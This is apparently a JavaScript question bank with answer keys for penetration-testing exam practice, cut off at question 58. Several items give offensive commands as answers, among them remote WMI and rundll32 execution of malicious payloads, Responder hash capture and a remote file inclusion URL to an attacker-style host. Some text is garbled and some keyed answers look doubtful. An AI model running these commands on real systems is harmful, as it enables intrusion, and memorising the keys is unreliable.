const questions = [
 /*question 1*/
{
  question: "During a penetration test engagement, your team has discovered multiple potential vulnerabilities in the target environment through initial scanning and enumeration.\n\nFindings:\nWeb application with outdated Apache version (2.4.39)\nDefault credentials on network printer (admin/admin)\nUnpatched SMB service (MS17—010)\nExposed Jenkins instance with weak password policy\n\nGiven the findings, which approach would be MOST appropriate for preparing for the next logical step you should take?",
  options: [
    "Update rules of engagement.",
    "Generate an automated scan report.",
    "Document your findings in vulnerability tracking system.",
    "Create an attack tree diagram."
  ],
  answer: ["Create an attack tree diagram."]
},

/*question 2*/
{
  question: "A penetration tester has been hired to test a global bank's wireless network. During reconnaissance, the tester discovers three SSIDs. Before initiating tests against the networks, the tester consults the statement of work for the project.\n\nWhich statement describes the reason for the tester's actions?",
  options: [
    "The tester is determining what time the testing can begin.",
    "The tester is determining which networks are in scope.",
    "The tester is determining how to escalate testing issues.",
    "The tester is determining which type of tests are allowed."
  ],
  answer: ["The tester is determining which networks are in scope."]
},

/*question 3*/
{
  question: "A penetration tester is conducting a security assessment for a large financial institution and receives the following output from their reconnaissance tools:\n\nTarget A:\nOS: Windows Server 2019\nRole: Domain Controller\nLast Patch: 2024-01-23\nOpen Ports: \nUsers Connected: 512\nSecurity Events: 15 failed login attempts in last hour\n\nTarget B:\nOS: RHEL 8\nRole: Core Banking Application\nLast Patch: 2024-01-02\nOpen Ports: 21, 443, 1521, 8443\nActive Sessions: 2,458\nDatabase Size: 2.5TB\nTLS: 1.2\nProcesses: oracledb, weblogic\n\nTarget C:\nOS: Windows 10 Enterprise\nRole: Developer workstation\nLast Patch: 2024-01-20\nOpen Ports: 445, 3389, 5985\nCustomapp: banking\nGroup Membership: Local Administrators\nGit Repositories: 15 active\nCPU Usage: 75%\n\nTarget D:\nOS: Ubuntu 22.04\nRole: Network Monitoring\nLast Patch: 2024-01-18\nOpen Ports: 161, 162, 443, 8080\nSNMP: v2c enabled\nInterfaces Monitored: 245\nAlert Status: Normal\n\nBased on the output above, which of the following targets should be prioritized as the highest-value asset?",
  options: [
    "Network monitoring system",
    "Core banking application server",
    "Developer workstation",
    "Domain controller"
  ],
  answer: ["Core banking application server"]
},

/*question 4*/
{
  question: "After performing an extensive network scan of a client's infrastructure, a penetration tester needs to verify the scan's completeness before proceeding with vulnerability analysis.\n\nWhich approach would be MOST effective in validating scan completeness?",
  options: [
    "Monitor system resource utilization during scans.",
    "Configure automated scan scheduling.",
    "Compare scan results across multiple tools and protocols.",
    "Review scan timestamps and duration metrics."
  ],
  answer: ["Compare scan results across multiple tools and protocols."]
},

/*question 5*/
{
  question: "A penetration tester uses an Nmap script to return the partial output shown below:\n\nStarting Nmap 7.92 (https://nmap.org) at 2022-04-29\nNmap scan report for domain.org (104.18.17.29)\nHost is up (0.031 s latency).\nOther addresses for domain.org (not scanned): 104.18.16.29\nPORT STATE SERVICE\n53/tcp filtered domain\nHost script results:\nns1.domain.org — 198.134.5.199\nns2.domain.org — 52.13.117.223\nwww.domain.org — 52.165.16.154\nwww2.domain.org — 23.202.231.167\nwww2.domain.org — 23.217.138.108\nsmtp.domain.org — 198.134.5.200\n\nWhat is the tester attempting to perform?",
  options: [
    "Robots.txt inspection",
    "DNS spoofing",
    "A DNS zone transfer",
    "Hostname enumeration"
  ],
  answer: ["Hostname enumeration"]
},

/*question 6*/
{
  question: "During a security assessment of a client's website, a penetration tester discovers the target is running WordPress. They need to identify vulnerable plugins, themes, and user accounts that could be exploited.\n\nWhich tool would be MOST effective for performing a comprehensive WordPress security assessment?",
  options: [
    "Joomscan with enumeration mode",
    "WPScan with API integration",
    "Nikto with CMS detection",
    "CMSmap with default credentials"
  ],
  answer: ["WPScan with API integration"]
},

/*question 7*/
{
  question: "While performing a wireless network assessment at a large corporate office, a penetration tester needs to identify potential rogue access points and analyze Wi-Fi channel usage.\n\nWhich tool is MOST effective for wireless channel scanning and signal analysis?",
  options: [
    "Nmap with the -ss flag",
    "TCP dump",
    "Kismet",
    "Burp Suite Professional"
  ],
  answer: ["Kismet"]
},

/*question 8*/
{
  question: "A security team needs to implement continuous security testing during the development of a new financial application. The application handles sensitive customer data, and the team wants to use agents within the application to detect vulnerabilities while the application is running in a test environment.\n\nWhich testing approach would be MOST effective in identifying security issues during runtime?",
  options: [
    "Dynamic Application Security Testing (DAST)",
    "Interactive Application Security Testing (IAST)",
    "Software Composition Analysis (SCA)",
    "Static Application Security Testing (SAST)"
  ],
  answer: ["Interactive Application Security Testing (IAST)"]
},

/*question 9*/
{
  question: "While performing a test against an API, a penetration tester crafts an API request and receives the response below:\n\nHTTP/1.1 403 Forbidden\nServer: nginx\nDate: Mon, 30 Mar 2022 GMT\nContent-Type: text/html; charset=utf-8\nTransfer-Encoding: chunked\nConnection: keep-alive\nVary: Accept-Encoding\nCache-control: no-cache, no-store, max-age=0\nPragma: no-cache\nExpires: Fri, 01 Jan 1990 GMT\n: sameorigin\nX-Robots-Tag: none\n: IE=Edge, chrome=1\nX-Request-Id: b3415491bc\nx-Runtime: 0.064248\nContent-Encoding: gzip\n\nWhat should the tester do NEXT?",
  options: [
    "Specify an account with the correct permissions.",
    "Correct the syntax error in the original API request.",
    "Format the payload in the request properly.",
    "Provide credentials when making the API request."
  ],
  answer: ["Specify an account with the correct permissions."]
},

/*question 10*/
{
  question: "A penetration tester runs a command and receives the following output:\n\nuser: JaneDoe\ndomain: domain.local\nprogram: cmd.exe\nimpers: no\nNTLM: 7d46b8c0b720c8722df2fb584c573310\n\nWhich statement describes the tester's actions?",
  options: [
    "The tester is enumerating service principal names (SPNs) from Microsoft Active Directory.",
    "The tester is using a stolen hash to authenticate as a different user.",
    "The tester is performing a brute force password attack on a user account.",
    "The tester is applying a hashing algorithm to a Windows executable."
  ],
  answer: ["The tester is using a stolen hash to authenticate as a different user."]
},

/*question 11*/
{
  question: "A penetration tester has been tasked with determining if an employee with privileged access can remove intellectual property from the network through covert channels and avoid detection. Which method would the tester MOST likely use to accomplish this task?",
  options: [
    "ICMP tunneling",
    "ARP spoofing",
    "Port scanning",
    "SYN Flood"
  ],
  answer: ["ICMP tunneling"]
},

/*question 12*/
{
  question: "During a red team engagement, a penetration tester successfully compromises a Windows domain workstation and wants to move laterally within the network without stealing password hashes. Which attack technique would be MOST effective for leveraging existing authentication credentials?",
  options: [
    "NTLM relay",
    "Password spraying",
    "Kerberos ticket reuse",
    "LDAP injection"
  ],
  answer: ["Kerberos ticket reuse"]
},

/*question 13*/
{
  question: "Which statement explains why a penetration tester would receive the following output during a reconnaissance exercise? OS : SCAN (V=7 . 928E=4 +D=5/ OS : M=628E37 FD8P=i 686-pc-windows-windows) SEQ ( +11 OS : ) SEQ ) OPS (01=M5B4NW8ST OS : 11802=M5B4NW8 STI 1803=M5B4NW8NNT 11804=M5B4NW8ST 11805=M5B4NW8ST 11806=M5B4 S OS : Til ) WIN ) ECN OS : Tl T2 ( OS : T3 OS : T4 T5 OS : T6 OS : O+Q=) T7 Ul OS : 164 IE )",
  options: [
    "The tester ran the nmap -O command.",
    "The tester ran the nmap -Pn command.",
    "The tester ran the nmap -ST command.",
    "The tester ran the nmap -sv command."
  ],
  answer: ["The tester ran the nmap -O command."]
},

/*question 14*/
{
  question: "During a web application assessment, a penetration tester needs to quickly enumerate server configurations, misconfigurations, and potentially dangerous files across multiple web servers in a DMZ. Which scanning tool would be MOST effective for identifying common web server vulnerabilities and exposed sensitive files?",
  options: [
    "Burp Suite Scanner",
    "SQLmap",
    "Nikto",
    "Dirbuster"
  ],
  answer: ["Nikto"]
},

/*question 15*/
{
  question: "During reconnaissance of a client's wireless network, a penetration tester encounters a captive portal page. Upon inspection, the tester gathers the information below: subject Alternative Name: DNS : wifi—portal. local, DNS : LOCAL Issuer: commonName=interna1 private CA CA/ organizationName=interna1 / stateOr ProvinceName=none / countryName=none Public Key type: rsa Public Key bits: 2048 Signature Algorithm: shalWithRSAEncryption Not valid before: Not valid after: MD5: 1512 871d 8a04 6f21 8af5 8a65 512a 2ee3 SHA-I: 906c 871d 8a19 6f21 lc3e b3d5 512a bf68 f95c ffcd ssl—date: : 00; Os from scanner time. Based on this finding, what should the tester do NEXT?",
  options: [
    "Attempt an on-path attack.",
    "Perform DNS spoofing.",
    "Try a buffer overflow attack.",
    "Initiate a DoS attack."
  ],
  answer: ["Attempt an on-path attack."]
},

/*question 16*/
{
  question: "A security consultant is implementing the OCTAVE threat modeling framework during the planning phase of a penetration test. Which phase of OCTAVE would be MOST appropriate for identifying key systems that process sensitive customer data and documenting their technical vulnerabilities?",
  options: [
    "Risk identification workshops",
    "Organizational vulnerability evaluation",
    "Asset-based threat profiling",
    "Technology vulnerability evaluation"
  ],
  answer: ["Technology vulnerability evaluation"]
},

/*question 17*/
{
  question: "During a penetration test of a corporate network, an initial Nmap scan reports all systems as secure with no open ports. The client mentions that several critical services should be running. Which technique would be MOST effective for identifying potential false negatives in the scan results?",
  options: [
    "Running concurrent scans",
    "Increasing scanner verbosity",
    "Port scanning with timing adjustments",
    "Using default scan configurations"
  ],
  answer: ["Port scanning with timing adjustments"]
},

/*question 18*/
{
  question: "During a penetration test against a cloud-based enterprise environment, a tester discovers that SAML is used for single sign-on authentication between services. Which attack technique would be most effective for exploiting SAML implementation weaknesses?",
  options: [
    "Cross-site request forgery",
    "XML signature wrapping",
    "Certificate cloning",
    "Session token hijacking"
  ],
  answer: ["XML signature wrapping"]
},

/*question 19*/
{
  question: "A company implements a BYOD policy for smartphones. A security administrator wants to ensure that the policy does not create unnecessary risks. As part of testing, the administrator wants to determine if devices or users are susceptible to a Bluejacking attack. What should the administrator do to test this concern?",
  options: [
    "Send anonymous messages to Bluetooth-enabled devices.",
    "Connect to user's phones via Bluetooth and extract data.",
    "Perform Bluetooth pairing and attempt to take over a device.",
    "Compromise connections while BLE devices are pairing."
  ],
  answer: ["Send anonymous messages to Bluetooth-enabled devices."]
},

/*question 20*/
{
  question: "A penetration tester needs to validate and analyze results from multiple scanning tools across a large network assessment. They have the following scan outputs:\n\n# Nmap scan output (scan1.txt):\nStarting Nmap 7.94 (https://nmap.org)\nNmap scan report for target.example.com (192.168.1.100)\nHost is up (0.015s latency).\nPORT  STATE  SERVICE  VERSION\n22/tcp  open  ssh   OpenSSH 8.9\n80/tcp  open  http  Apache 2.4.52\n443/tcp open  https nginx 1.18.0\n3306/tcp open  mysql MySQL 5.7.38\n\n# Nikto scan output (scan2.txt):\n- Nikto v2.5.0\n+ Target IP: 192.168.1.100\n+ Target Hostname: target.example.com\n+ SSL Info: subject: /CN=target.example.com\n    ciphers: TLS AES 256 GCM SHA384\n+ Port: 443\n+ vulnerabilities: CVE-2021-44790 (Apache), CVE-2022-40897 (nginx)\n\n# Custom vulnerability scanner output (scan3.json):\n{\n\t\"target\": \"192.168.1.100\",\n\t\"findings\": [\n\t\t{\n\t\t\t\"port\": 3306,\n\t\t\t\"severity\": \"HIGH\",\n\t\t\t\"description\": \"MySQL weak password policy\",\n\t\t\t\"cve\": \"CVE-2023-12345\"\n\t\t},\n\t\t{\n\t\t\t\"port\": 80,\n\t\t\t\"severity\": \"MEDIUM\",\n\t\t\t\"description\": \"Apache version disclosure\",\n\t\t\t\"cve\": \"CVE-2021-44790\"\n\t\t}\n\t]\n}\nWhich scripting approaches would be most effective for processing and correlating the scan output data? (Select TWO).",
  options: [
    "Configure a Visual Basic script to automate the collection of individual scan output files.",
    "Create a Python script utilizing the pandas library to perform statistical analysis of scan coverage.",
    "Create a Python script using data parsing libraries to normalize and compare multiple scan output formats.",
    "Develop a Perl script with pattern matching capabilities to extract and correlate enumeration findings.",
    "Write a Bash script that uses regular expressions to extract specific values from each scan output file."
  ],
  answer: [
    "Create a Python script using data parsing libraries to normalize and compare multiple scan output formats.",
    "Develop a Perl script with pattern matching capabilities to extract and correlate enumeration findings."
  ]
},
/*question 21*/
{
  question: "A security consultant has been hired to attack a branch office network. The consultant identifies that an Intrusion Detection System (IDS) is running on the network and is concerned that network scans will trigger an alert. To protect their attack box, the consultant wants to ensure that their scanning activities are not easily detectable and plans to initiate an idle scan. What is the benefit of this approach?",
  options: [
    "The scan will not complete the TCP connection process.",
    "No packets are sent directly to the target.",
    "The scan is completed using a low packet rate.",
    "It has the smallest footprint compared to other scans."
  ],
  answer: ["No packets are sent directly to the target."]
},

/*question 22*/
{
  question: "An organization's cloud security team discovers unusual API calls originating from an EC2 instance. Upon investigation, they find that the instance's IAM role has excessive permissions due to a misconfiguration. Which attack technique would MOST effectively exploit this situation to gain broader access to cloud resources?",
  options: [
    "DNS zone transfer exploitation",
    "Container escape to access host credentials",
    "Cloud storage bucket enumeration",
    "IAM role assumption through instance metadata"
  ],
  answer: ["IAM role assumption through instance metadata"]
},

/*question 23*/
{
  question: "A penetration test has compromised a workstation within a Windows network. To establish remote code execution on a second machine for lateral movement, the penetration tester decides to execute a malicious payload named malicious.exe on a remote system with IP address 192.168.1.5 using Windows Management Instrumentation (WMI). Which command should the tester use?",
  options: [
    "wmic [node:\"192.168.1.5\" process call create \"malicious.exe\"",
    "wmic /node:\"192.168.1.5\" service call startservice \"malicious.exe\"",
    "wmic /node:\"192.168.1.5\" process where name='malicious.exe' call start",
    "wmic /node:\"192.168.1.5\" process call create \"cmd.exe /c malicious.exe\""
  ],
  answer: ["wmic /node:\"192.168.1.5\" process call create \"cmd.exe /c malicious.exe\""]
},

/*question 24*/
{
  question: "A penetration tester has gained access to a target's internal network and suspects that sensitive data is being shared across network resources. The tester wants to enumerate shares on a specific Windows server to identify accessible resources. Which technique would be the MOST effective?",
  options: [
    "Running a port scan to identify open SMB ports",
    "Using the net view command",
    "Utilizing SNMP enumeration tools",
    "Analyzing the network using Wireshark"
  ],
  answer: ["Using the net view command"]
},

/*question 25*/
{
  question: "A penetration tester has identified a web application parameter that allows file path manipulation. During testing, they notice the application concatenates the user input with a .php extension. Which attack would be MOST effective for accessing sensitive system files on the target server?",
  options: [
    "Server-side request forgery with internal DNS",
    "Cross-site scripting with base64 encoding",
    "Directory traversal with URL encoding",
    "Local file inclusion with null byte injection"
  ],
  answer: ["Local file inclusion with null byte injection"]
},

/*question 26*/
{
  question: "During a wireless penetration test, a security consultant needs to assess client-side security awareness and the effectiveness of network security controls. The organization has approved man-in-the-middle attacks as part of the assessment scope. Which capabilities accurately describe WiFi-Pumpkin functionality? (Select TWO.)",
  options: [
    "Creates rogue access points with captive portals to intercept user credentials and network traffic.",
    "Cracks WEP and WPA handshakes captured from nearby wireless networks.",
    "Conducts session hijacking through transparent proxy functionality and SSL strip attacks.",
    "Performs wireless packet injection to force client deauthentication.",
    "Broadcasts forged beacon frames to flood wireless network discovery results."
  ],
  answer: [
    "Creates rogue access points with captive portals to intercept user credentials and network traffic.",
    "Conducts session hijacking through transparent proxy functionality and SSL strip attacks."
  ]
},

/*question 27*/
{
  question: "A penetration tester performs active reconnaissance against a target web server. An nmap scan indicates that the server is vulnerable to a well-known exploit over port 8080. What should the tester do before attempting to exploit the vulnerability?",
  options: [
    "Determine if the vulnerability is a true positive.",
    "Determine if the vulnerability is a true negative.",
    "Determine if the vulnerability is a false negative.",
    "Determine if the vulnerability is a false positive."
  ],
  answer: ["Determine if the vulnerability is a true positive."]
},

/*question 28*/
{
  question: "A penetration tester needs to perform a man-in-the-middle attack to capture authentication hashes from Windows systems in a target environment. Which Responder configuration would be most effective for intercepting and capturing NetNTLM hashes?",
  options: [
    "responder -l eth0 -wrFv",
    "responder.py —interface eth0 --analyze —verbose",
    "responder -l eth0 -A —1m",
    "responder -l eth0 —wpad --basic"
  ],
  answer: ["responder -l eth0 -wrFv"]
},

/*question 29*/
{
  question: "A penetration tester's findings report claims that a company's poor permissions management process has led to convoluted resource access procedures and excessive privilege creep. As a result, the tester claims that many employees have access to sensitive data outside of the scope of their jobs. The tester recommends for the company to identify an administrative control that will mitigate this risk through centralized permissions management for each job silo. Which is the BEST solution for the company to implement to address this concern?",
  options: [
    "Discretionary access control",
    "Role-based access control",
    "Attribute-based access control",
    "Mandatory access control"
  ],
  answer: ["Role-based access control"]
},

/*question 30*/
{
  question: "During a penetration test, a consultant is analyzing a network in an industrial control system (ICS) environment. The tester observes that the communication follows a request/response pattern between a client and multiple servers. The consultant suspects the use of Modbus protocol in this environment. Verifying which of the following will confirm the consultant's hunch?",
  options: [
    "The communication uses IJDP and is designed for resource-constrained IoT devices.",
    "The communication uses a publish/subscribe model and encrypts all communications by default.",
    "The communication uses a proprietary protocol primarily for HVAC systems.",
    "The communication uses a request/response protocol that operates primarily on TCP port 502."
  ],
  answer: ["The communication uses a request/response protocol that operates primarily on TCP port 502."]
},

/*question 31*/
{
  question: "During a penetration test of a Windows domain environment, an attacker has gained initial access and needs to extract Kerberos tickets from memory in real-time. Which Rubeus command would be MOST effective for capturing TGT and TGS tickets during user authentication events?",
  options: [
    "tgtdeleg",
    "harvest",
    "s4u",
    "asktgt"
  ],
  answer: ["harvest"]
},

/*question 32*/
{
  question: "A penetration tester needs to provide detailed remediation guidance in their report for critical vulnerabilities discovered during an assessment. Which of the following components should be included in the remediation section to ensure the most comprehensive and actionable guidance?",
  options: [
    "Common vulnerability identifiers and attack signatures",
    "Historical vulnerability statistics and trends",
    "Step-by-step mitigation procedures with configuration examples",
    "Industry compliance violation summaries"
  ],
  answer: ["Step-by-step mitigation procedures with configuration examples"]
},

/*question 33*/
{
  question: "You are conducting a penetration test and want to execute a malicious payload embedded in a DLL file on a remote Windows machine. Which steps would allow you to successfully execute a malicious DLL malicious.dll using rund1132.exe? (Select TWO.)",
  options: [
    "Place malicious.dll in a writable directory on the remote machine",
    "Run rund1132.exe C:\\Temp\\malicious.dll,ExportedFunction",
    "Run rund1132.exe C:\\Temp\\malicious.dll",
    "Run rund1132.exe \\\\192.168.1.5\\C$\\malicious.dll,ExportedFunction"
  ],
  answer: [
    "Place malicious.dll in a writable directory on the remote machine",
    "Run rund1132.exe \\\\192.168.1.5\\C$\\malicious.dll,ExportedFunction"
  ]
},

/*question 34*/
{
  question: "A penetration test on a Windows system aims to achieve covert code execution by utilizing a built-in system utility. Evidence shows that mmc.exe can dynamically load specific DLLs and may be exploited for executing arbitrary code. What would be the MOST effective methods to execute a malicious DLL using mmc.exe? (Select TWO.)",
  options: [
    "Embed a malicious PowerShell command inside an .msc (Microsoft Management Console) file and run mmc.exe to trigger the payload.",
    "Use a vulnerability scanner to identify outdated software versions on the target system.",
    "Place the malicious DLL in a writable directory where mmc.exe searches for missing DLLs and launch mmc.exe.",
    "Create a malicious DLL containing a reverse shell payload and compile it to ensure it triggers on DLL load."
  ],
  answer: [
    "Place the malicious DLL in a writable directory where mmc.exe searches for missing DLLs and launch mmc.exe.",
    "Create a malicious DLL containing a reverse shell payload and compile it to ensure it triggers on DLL load."
  ]
},

/*question 35*/
{
  question: "A penetration tester has been hired to attempt data exfiltration for an automotive manufacturer. The tester has successfully accessed sensitive files and has connected to a remote server, as shown in the banner below. 250—sl.acme.com Hello GP [12.16.14.57] 250-SIZE 51828800 250-PIPELINING 250-AUTH PLAIN LOGIN 250 HELP What should the tester do before attempting exfiltration?",
  options: [
    "Enable TLS.",
    "Query Shodan.",
    "Launch Metasploit.",
    "Enable WinRM."
  ],
  answer: ["Enable TLS."]
},

/*question 36*/
{
  question: "A penetration tester discovers sensitive information during a penetration testing exercise. Which document outlines how this information should be handled?",
  options: [
    "Master service agreement",
    "Non-disclosure agreement",
    "Statement of work",
    "Rules of engagement"
  ],
  answer: ["Rules of engagement"]
},

/*question 37*/
{
  question: "A penetration tester needs to bypass Multi-Factor Authentication (MFA) during a social engineering assessment of a client organization. The tester requires a tool that can perform real-time phishing attacks while intercepting session cookies and tokens. Which tool would be MOST appropriate for this assessment?",
  options: [
    "Recon-ng",
    "Maltego",
    "Evilginx",
    "Gophish"
  ],
  answer: ["Evilginx"]
},

/*question 38*/
{
  question: "During a red team engagement, a penetration tester has gained access to a domain-joined Windows workstation and discovers that Kerberos authentication is in use. The tester wants to escalate privileges within the Active Directory (AD) environment. Which attack technique would be MOST effective for exploiting Kerberos misconfiguration?",
  options: [
    "Golden ticket attack",
    "SAM dump",
    "LDAP enumeration",
    "Domain password spray"
  ],
  answer: ["Golden ticket attack"]
},

/*question 39*/
{
  question: "A penetration tester runs the command and receives the output provided below: msf > wmap run —e [ * ]Using ALL wmap enabled modules . [ - ]NO WMAP NODES DEFINED. Executing local modules [ * ]Testing target : [ * ]site: 10.10.2.122 (10.10.2.122) [ * ]Port: 80 SSL: false [ * ]Testing started. 2022—05—20 10:24: 33 -0500 [ * ] =[ SSL testing ] = [ * ]Target is not SSL. SSL modules disabled. [ * ] =[ Web Server testing ] = [ * ]Module auxiliary/ scanner/http/http version [ + ]10.10.2.122 : 80 Apache/ 2.4.1 (Ubuntu) DAV/2 ( Powered by PHP/7 . 4.0 ) [ * ]Module auxiliary/ scanner/http/open proxy [ * ]Module auxiliary/ admin/http/tomcat administration [ * ]Module auxiliary/ admin/http/tomcat utf8 traversal What should the tester do NEXT?",
  options: [
    "Scan the target system for vulnerabilities.",
    "Provide a list of Uniform Resource Locators (URLs).",
    "Check the database for vulnerabilities.",
    "Specify a list of targets to be scanned."
  ],
  answer: ["Check the database for vulnerabilities."]
},

/*question 40*/
{
  question: "A penetration tester is contracted to test a company's internet-accessible servers. In a public code repository for the company, the tester discovers the file snippet below. Common Name: smtp.domain.name Issuer: commonName=srv1.domain.name CA/organizationName=srv1/stateOrProvinceName=none/countryName=none Public Key type: rsa Public Key bits: 2048 signature Algorithm: sha1WithRSAEncryption Not valid before: 2022-04-17T06:09:04 Not valid after: 2023-04-16T06:09:04 MD5: 1512 871d 8a04 6f21 8af5 8a65 512a 2ee3 SHA-1: 906c 871d 8a19 6f21 lc3e b3d5 512a bf68 f95c ffcd ssl-date: 2022-04-17T12:30:40+00:00; 0s from scanner time. What could the tester do to take advantage of this discovery? (Select TWO.)",
  options: [
    "Attempt an ARP poisoning attack.",
    "Attempt an eavesdropping attack.",
    "Attempt an on-path attack.",
    "Attempt a password cracking attack.",
    "Attempt an injection attack."
  ],
  answer: [
    "Attempt an eavesdropping attack.",
    "Attempt an on-path attack."
  ]
},

/*question 41*/
{
  question: "A security team needs to implement comprehensive vulnerability scanning for their cloud-native environment, including container images, Infrastructure as Code (IaC) files, and cloud configurations. Which tool would be MOST effective for scanning multiple components of the cloud-native stack?",
  options: [
    "Dirb",
    "Trivy",
    "Maltego",
    "Hydra"
  ],
  answer: ["Trivy"]
},

/*question 42*/
{
  question: "During a web application security assessment, a penetration tester needs to identify hidden directories and potential backup files on a target web server. They want to use a tool that supports custom payloads and multiple concurrent connections. Which tool would be MOST effective for this discovery task?",
  options: [
    "Gobuster with pattern matching",
    "FFuf with virtual host discovery",
    "Dirbuster with wordlist mutation",
    "Wfuzz with recursive discovery mode"
  ],
  answer: ["Wfuzz with recursive discovery mode"]
},

/*question 43*/
{
  question: "A security analyst evaluates a network's security scan. The analyst runs the following command: nmap —SN 10.10. 0.1 What is the purpose of this command?",
  options: [
    "To send a TCP segment with no flags in the packet header",
    "To send a TCP segment with the SYN flag set in the packet header",
    "To send a TCP segment with the FIN, PSH, and URG flags set in the packet header",
    "To send a TCP segment with the FIN flag set in the packet header"
  ],
  answer: ["To send a TCP segment with no flags in the packet header"]
},

/*question 44*/
{
  question: "A penetration tester completes reconnaissance using scripts and automated tools. The resulting output includes logs from a web server. During analysis of logs, the tester discovers the following text listed repeatedly in POST requests: or Which attack should the tester initiate to further evaluate this finding?",
  options: [
    "CSRF",
    "Directory traversal",
    "SQL injection",
    "XSS"
  ],
  answer: ["SQL injection"]
},

/*question 45*/
{
  question: "A penetration tester receives a partial output of a tool, as shown below: ;;QUESTION SECTION: ; domain. name. IN MX ;; ANSWER SECTION: domain. name. 60 IN 10 domain—org.mail . protection. domain. name . What is the tester attempting to perform?",
  options: [
    "LDAP queries",
    "CSRF",
    "Cache poisoning",
    "DNS lookups"
  ],
  answer: ["DNS lookups"]
},

/*question 46*/
{
  question: "A security consultant is performing a vulnerability assessment of an enterprise network that contains sensitive financial data. The client has provided domain administrator credentials and requested the most comprehensive scan possible. Which scanning approach would provide the MOST detailed vulnerability information?",
  options: [
    "Port scanning with banner grabbing",
    "Unauthenticated vulnerability scanning",
    "Passive vulnerability scanning",
    "Authenticated vulnerability scanning"
  ],
  answer: ["Authenticated vulnerability scanning"]
},

/*question 47*/
{
  question: "During a penetration test, the tester discovers an API with public endpoints. Which tool would be MOST effective for identifying exposed API keys during secrets enumeration?",
  options: [
    "Wireshark",
    "TruffleHog",
    "Postman",
    "Burp Suite"
  ],
  answer: ["TruffleHog"]
},

/*question 48*/
{
  question: "A penetration tester has gained access to an application running in a Docker container. The tester wants to escape out of the container and access the host operating system. Which should the tester try FIRST?",
  options: [
    "Attempt to update the # escape command to update the parser directive to 't'.",
    "Add ENTRYPOINT [\"/bin/bash\", \"-c\", \"echo Escape Test\"] to the Dockerfile.",
    "Use the EXPOSE command to specify an unused container port that can be attacked.",
    "Attempt to run the docker run -t -i ubuntu bash command from within the container."
  ],
  answer: ["Attempt to run the docker run -t -i ubuntu bash command from within the container."]
},

/*question 49*/
{
  question: "A penetration tester receives the following vulnerability scan output for four critical systems in a healthcare organization: Target A — Patient Records Database CVE-2024-1234 CVSS v3.1 vector: CVSS:3. Base Score: 10.0 Exploitable: Yes Patch Available: Yes Last Successful Auth: 12 minutes ago Target B — Medical Imaging Server CVE-2024-5678 CVSS v3.1 Vector: CVSS:3. Base Score: 7.5 Exploitable: Yes Patch Available: No Active Connections: 47 Target C — Emergency Response System CVE-2024-9012 CVSS v3.1 vector: CVSS:3. Base Score: 9.1 Exploitable: Yes Patch Available: Yes System Uptime: 127 days Target D — Staff Authentication Server CVE-2024-3456 CVSS v3.1 Vector: CVSS:3. Base Score: 7.2 Exploitable: Yes Patch Available: Yes Failed Login Attempts:23 Based on the CVSS base scores and associated metrics in the output, which target should be prioritized for immediate testing?",
  options: [
    "Patient Records Database",
    "Staff Authentication Server",
    "Emergency Response System",
    "Medical Imaging Server"
  ],
  answer: ["Patient Records Database"]
},

/*question 50*/
{
  question: "A testing client received a bill from a security testing company. The client believes they were billed incorrectly for the work performed. They do not argue the fact that the work was performed or the quality of the work, only the amount that was billed for the work. Where would the parties MOST likely find the information required to resolve the problem?",
  options: [
    "NDA",
    "SOW",
    "EULA"
  ],
  answer: ["SOW"]
},

/*question 51*/
{
  question: "What is the role of an MSA in contract negotiations?",
  options: [
    "It helps the parties involved to negotiate future agreements and transactions quickly.",
    "It provides specific details of the work to be performed and the deliverable dates.",
    "It defines the terms of confidentiality for both parties.",
    "It specifies acceptance criteria and a payment schedule."
  ],
  answer: ["It helps the parties involved to negotiate future agreements and transactions quickly."]
},

/*question 52*/
{
  question: "A penetration tester discovers the following code snippet on a cloud server: $page — $ GET [ 'page' ] ; include ($page) ; The tester makes the following HTTP request: http://your-domain.go/na/?page=http://hack.you/takeover-account.php Which BEST describes the exploit being used?",
  options: [
    "Cookie poisoning",
    "Remote file inclusion",
    "HTTP request smuggling",
    "Directory traversal"
  ],
  answer: ["Remote file inclusion"]
},

/*question 53*/
{
  question: "During a penetration test of a healthcare organization's web application, automated scanning tools report multiple SQL injection vulnerabilities. Which action would be MOST effective for validating these scan results and identifying potential false positives?",
  options: [
    "Increasing scan sensitivity",
    "Running additional automated scans",
    "Reviewing scan configuration files",
    "Manual payload testing"
  ],
  answer: ["Manual payload testing"]
},

/*question 54*/
{
  question: "A security team needs to conduct a comprehensive security assessment of a new Android mobile banking application before its release. Which tool would be MOST effective for performing both static and dynamic analysis of the mobile application?",
  options: [
    "MobSF",
    "Burp Suite Mobile Assistant",
    "Frida",
    "Drozer"
  ],
  answer: ["MobSF"]
},

/*question 55*/
{
  question: "During a penetration test, an analyst discovers a list of leaked credentials from a publicly available password dump site. Which of the following tools would allow the analyst to identify which accounts in the dump are still valid?",
  options: [
    "Have I Been Pwned (HIBP)",
    "Nikto",
    "Hydra",
    "John the Ripper"
  ],
  answer: ["Hydra"]
},

/*question 56*/
{
  question: "A penetration tester uses the following Python script to automate password tests: import requests def get_access_token (host, port, usr, pwd) : access_token = None requests . packages . ur11ib3. disable_warnings ( ) pload= '{ { \"grant_type: \"p\", \"u\": \"{}\", \"p\": \"{}\"}}'. format (usr, pwd) ah = {\"Content—Type\": \"application/ json\", \"Accept\": \"application/ json\" } try: response =requests . post ( \"https : // target. go/ api/\" . format (host, port) , data=pload, verify=Fa1se, headers=ah) if response . status_code == 200: access_token = response. json ( ) . get (' access_token') print ( \"Login tested\") except Exception as e: print ( \"Error encountered\") return access_token def main() : access_token = get_access_token ('target.go','443',' admin','pa123') if __name__ == '__main__': main () What will the script return if an incorrect password is supplied?",
  options: [
    "HTTP 401 Unauthorized",
    "Error encountered",
    "Login tested",
    "Access token"
  ],
  answer: ["Error encountered"]
},

/*question 57*/
{
  question: "A security analyst needs to enumerate user accounts on multiple domain-joined Windows systems to identify potential privilege escalation vectors. Which PowerShell command would be MOST effective for gathering detailed user account information across multiple remote systems?",
  options: [
    "Get-WmiObject Win32_UserAccount -Filter \"LocalAccount=True\" -ComputerName (Get-Content .\servers.txt)",
    "Get-ADUser -Filter * -Properties *",
    "Get-LocalUser | Where-Object { $.Enabled -eq $true }",
    "Test-NetConnection -ComputerName (Get-Content .\servers.txt) -Port 445"
  ],
  answer: ["Get-WmiObject Win32_UserAccount -Filter \"LocalAccount=True\" -ComputerName (Get-Content .\servers.txt)"]
},

/*question 58*/
{
  question: "A penetration tester needs to modify a Python script that calculates the remaining hosts to scan in a network enumeration task. The script needs to track progress by computing the percentage of hosts completed. Which arithmetic operator would be MOST appropriate for calculating the decimal representation of the completion percentage?",
  options: [
    "Division operator (/)",
    "Exponentiation operator (**)",
